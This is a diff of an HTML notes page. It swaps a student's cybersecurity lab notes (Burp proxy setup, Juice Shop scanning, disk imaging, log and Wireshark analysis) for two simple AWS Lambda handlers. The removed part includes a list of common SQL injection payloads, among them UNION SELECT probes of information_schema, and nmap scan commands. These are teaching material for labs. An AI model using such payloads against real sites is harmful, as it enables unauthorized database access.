@@ -57,191 +57,67 @@
     }
 </script>
 <body>
-    <h3>python3 -m http.server 8080
-sudo tcpdump -i any -w capture.pcap port 8080</h3>
-    <h3>xss</h3>
-    <p>"C:\Program Files\Google\Chrome\Application\chrome.exe" --proxy-server="http=127.0.0.1:8081;https=127.0.0.1:8081" --proxy-bypass-list="<-loopback>"</p>
-<h3>password</h3>
-<p>
-import re<br><br>
 
-def check_password_strength(password):<br>
-&nbsp;&nbsp;&nbsp;&nbsp;if len(password) &lt; 8:<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "Weak: Password must be at least 8 characters long."<br><br>
+    <h2>Lambda Function 1 (SQS Message Processor)</h2>
+    <pre><code>
+def lambda_handler(event, context):
+    for record in event['Records']:
+        print("Message received from SQS:")
+        print(record['body'])
+        return {
+            'statusCode': 200,
+            'body': 'Message processed successfully'
+        }
+    </code></pre>
 
-&nbsp;&nbsp;&nbsp;&nbsp;if not any(char.isdigit() for char in password):<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "Weak: Password must include at least one number."<br><br>
+    <h2>Lambda Function 2 (S3 to DynamoDB)</h2>
+    <pre><code>
+import boto3
+from uuid import uuid4
+import urllib.parse
 
-&nbsp;&nbsp;&nbsp;&nbsp;if not any(char.isupper() for char in password):<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "Weak: Password must include at least one uppercase letter."<br><br>
+def lambda_handler(event, context):
 
-&nbsp;&nbsp;&nbsp;&nbsp;if not any(char.islower() for char in password):<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "Weak: Password must include at least one lowercase letter."<br><br>
+    # Initialize DynamoDB
+    dynamodb = boto3.resource('dynamodb')
+    table = dynamodb.Table('newtable12')   # your table name
 
-&nbsp;&nbsp;&nbsp;&nbsp;if not re.search(r'[!@#$%^&*(),.?":{}|&lt;&gt;]', password):<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "Medium: Add special characters to make your password stronger."<br><br>
+    if 'Records' in event:
 
-&nbsp;&nbsp;&nbsp;&nbsp;return "Strong: Your password is secure!"<br><br>
+        for record in event['Records']:
 
-def password_checker():<br>
-&nbsp;&nbsp;&nbsp;&nbsp;print("Welcome to the Password Strength Checker!")<br><br>
+            # Extract S3 details
+            bucket_name = record['s3']['bucket']['name']
+            object_key = urllib.parse.unquote_plus(
+                record['s3']['object']['key']
+            )
+            size = record['s3']['object'].get('size', -1)
+            event_name = record.get('eventName', 'Unknown')
+            event_time = record.get('eventTime', 'Unknown')
 
-&nbsp;&nbsp;&nbsp;&nbsp;while True:<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password = input("Enter your password (or type 'exit' to quit): ")<br><br>
+            # Ensure only your bucket is processed
+            if bucket_name == "week71f":
 
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if password.lower() == "exit":<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print("Thank you for using the Password Strength Checker! Goodbye!")<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break<br><br>
+                try:
+                    table.put_item(
+                        Item={
+                            'unique': str(uuid4()),
+                            'Bucket': bucket_name,
+                            'Object': object_key,
+                            'Size': size,
+                            'Event': event_name,
+                            'EventTime': event_time
+                        }
+                    )
 
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result = check_password_strength(password)<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(result)<br><br>
+                    print("SUCCESS: Data inserted into DynamoDB")
 
-if __name__ == "__main__":<br>
-&nbsp;&nbsp;&nbsp;&nbsp;password_checker()<br>
-</p>
-<h3>Analysing Android App Permissions and Mobile Traffic</h3>
-<p>
-in phone goto internet settings-> adv options-> select 8080 and 10.0.0.2 and example.com<br>
-goto burpsuite proxy settings<br>
-1.add binding all interfaces<br>
-2.select interface running 8080<br>
-3.goback intercept on<br>
-4.goto browser http://burp donwload<br>
-5.export certficate (key in der format)<br><br>
+                except Exception as e:
+                    print("ERROR:", str(e))
 
-cd C:\Users\aakas\AppData\Local\Android\Sdk\platform-tools<br>
-adb push C:\Users\aakas\Downloads\cacert.der /sdcard/Download/
-</p>
-
-<h3>Testing IoT Device Security</h3>
-<p>
-cmd:<br>
-docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop<br>
-ipconfig<br>
-kali:<br>
-terminal: nmap localhost<br>
-nmap -sV ip<br>
-browser : admin@juice-sh.op<br>
-' OR 1=1 --
-</p>
-
-<h3>Analyzing Disk Images Using dc3dd and Autopsy</h3>
-<p>
-echo "Cybersecurity Lab Evidence" > evidence.txt<br>
-lsblk<br>
-sudo apt update<br>
-sudo apt install dc3dd<br>
-dd if=/dev/zero of=/home/kali/disk_image.dd bs=1M count=100<br>
-mkfs.ext4 /home/kali/disk_image.dd<br>
-echo "Acquisition started" > /home/kali/acquisition.log<br>
-md5sum /home/kali/disk_image.dd >> /home/kali/acquisition.log<br>
-sha256sum /home/kali/disk_image.dd >> /home/kali/acquisition.log<br>
-cat /home/kali/acquisition.log<br>
-autospy
-</p>
-
-<h3>Experiment 18: Log File Analysis (Simple Steps)</h3>
-<p>
-Open terminal<br>
-Go to log directory<br>
-cd /var/log<br>
-ls<br>
-Check successful login history<br>
-last<br>
-View system logs<br>
-journalctl | less<br>
-Find failed login attempts<br>
-journalctl | grep "Failed"<br>
-Check SSH login activity<br>
-journalctl | grep ssh<br>
-Find system errors<br>
-journalctl | grep -i error<br><br>
-
-Simulate Attack (Important)<br>
-Install SSH<br>
-sudo apt install openssh-server -y<br>
-Start SSH service<br>
-sudo service ssh start<br>
-Generate failed login attempts<br>
-ssh fakeuser@localhost<br><br>
-
-(enter wrong password multiple times)<br><br>
-
-Analyze Attack<br>
-Check failed password logs<br>
-journalctl | grep "Failed password"<br>
-Extract IP address<br>
-journalctl | grep "Failed password" | awk '{print $11}'<br>
-Count number of attempts<br>
-journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr<br>
-Alternative command<br>
-sudo lastb<br><br>
-
-Result<br>
-Identify repeated IP (example: 127.0.0.1)<br>
-Multiple attempts = brute force attack
-</p>
-
-<h3>NETWORK FORENSICS USING WIRESHARK</h3>
-<p>
-1.open wireshark eth)<br>
-2.tcp<br>
-ip.addr == 192.168.0.161<br>
-tcp.stream eq2 -> follow<br>
-3.nmap -sS windowip<br>
-tcp.flags.syn == 1 && tcp.flags.ack == 0<br>
-4.statistics
-</p>
-
-<h3>Privacy Audit of Popular Apps (Desktop WhatsApp) and Websites (Facebook) & Data Breach Case Study Analysis</h3>
-<p>
-sudo apt update<br>
-sudo apt install nodejs npm -y<br>
-sudo npm install -g nativefier<br>
-nativefier https://web.whatsapp.com<br>
-cd WhatsAppWeb-linux-x64<br>
-./WhatsAppWeb<br>
-login and send<br>
-https://reports.exodus-privacy.eu.org<br>
-wireshark -tls dns<br><br>
-
-facebook login<br>
-burpsuite -127.0.0.1 8080<br>
-intercept on<br>
-analyze network traffic
-</p>
-    <h3>SQL Injection</h3>
-<p>
-' OR 1=1 -- <br>
-' OR 1=1# <br>
-' OR '1'='1' -- <br>
-' OR '1'='1'# <br>
-" OR "1"="1" -- <br>
-" OR "1"="1"# <br>
-admin' -- <br>
-admin' # <br>
-' OR ''=' <br>
-' OR 'x'='x <br>
-' OR 'a'='a <br>
-') OR ('1'='1 -- <br>
-') OR ('a'='a -- <br>
-' AND 1=1 -- <br>
-' AND 1=2 -- <br>
-' AND 'a'='a <br>
-' AND 'a'='b <br>
-' ORDER BY 1 -- <br>
-' ORDER BY 2 -- <br>
-' ORDER BY 3 -- <br>
-' ORDER BY 4 -- <br>
-' UNION SELECT NULL -- <br>
-' UNION SELECT NULL,NULL -- <br>
-' UNION SELECT NULL,NULL,NULL -- <br>
-' UNION SELECT 1,2 -- <br>
-' UNION SELECT user(),database() -- <br>
-' UNION SELECT version(),database() -- <br>
-' UNION SELECT table_name,NULL FROM information_schema.tables -- <br>
-' UNION SELECT column_name,NULL FROM information_schema.columns -- <br>
-</p>
+    else:
+        print("No 'Records' key found in the event.")
+    </code></pre>
 
 </body>
     <button onclick="toggleMode()">Toggle Dark/Light Mode</button>
